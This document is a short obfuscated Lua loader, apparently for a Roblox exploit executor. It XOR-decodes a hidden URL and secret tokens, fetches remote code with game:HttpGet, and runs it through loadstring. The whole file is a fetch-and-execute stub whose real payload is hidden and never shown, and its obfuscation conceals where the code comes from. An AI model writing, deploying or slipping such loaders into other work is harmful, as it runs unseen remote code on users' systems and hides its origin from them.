local function A(t,k)
local r={}
local bx=(bit32 and bit32.bxor)or function(a,b)
local n,p=0,1
while a>0 or b>0 do
local aa=a%2
local bb=b%2
if aa~=bb then n=n+p end
a=(a-aa)/2
b=(b-bb)/2
p=p*2
end
return n
end
for i=1,#t do
r[i]=string.char(bx(t[i],k))
end
return table.concat(r)
end

local K=83
local U=A({59,39,39,35,32,105,124,124,49,60,63,55,126,39,33,54,54,126,107,103,102,49,125,49,63,58,39,41,56,48,60,61,39,50,32,125,36,60,33,56,54,33,32,125,55,54,37},K)
local P=A({124,12,96,53,124,107,106,102,49,48,54,103,53,107,99,54,48,107,106,100,97,98,99,54,102,50,53,102,100,124,33},K)
local S=A({24,12,43,101,27,99,60,18,106,102,97,27,33,102,7,22,50,36,102,55,37,59,43,28,43,2,101,35,102,18,18,5,55,53,17,49,97,11,11,9,7,6,6,106,7,24,34,53,17,18,3,29,24,1,29,20,41,58,26,38,58,56,43,50,24,31,34,6,2},K)
local Z=A({0,12,42,96,30,43,11,5,17,52,99,61,4,55,56,16,9,18,98,50,3,59,17,29,31,17,5,9,96,16,37,10,27,54,4,52,56,21,99,24,35,10,56,31,103,52,29,18},K)
local V=A({96,125,100,125,106},K)

local function H(s)
local n=7
for i=1,#s do
n=((n*131)+string.byte(s,i)+17)%1000000007
end
return tostring(n)
end

local function N()
local t=tostring(os.time())
local r=tostring(math.random(100000,999999))..tostring(math.random(100000,999999))
return t.."-"..r
end

local function B(s)
if type(s)~="string"or s==""then return true end
local l=s:lower()
if l:find("permission denied",1,true)then return true end
if l:find("not found",1,true)and #s<300 then return true end
if l:find("<html",1,true)and #s<2000 then return true end
return false
end

local q=N()
local g=H(S.."|"..V.."|"..q.."|"..Z)
local ok,src=pcall(function()
return game:HttpGet(U..P.."?v="..V.."&n="..q.."&s="..g,true)
end)

if not ok or B(src)then
warn("[3F] Falha ao carregar.")
return
end

local f,e=loadstring(src)
if not f then
warn("[3F] Erro ao compilar:",e)
return
end

local ok2,e2=pcall(f)
if not ok2 then
warn("[3F] Erro ao executar:",e2)
end
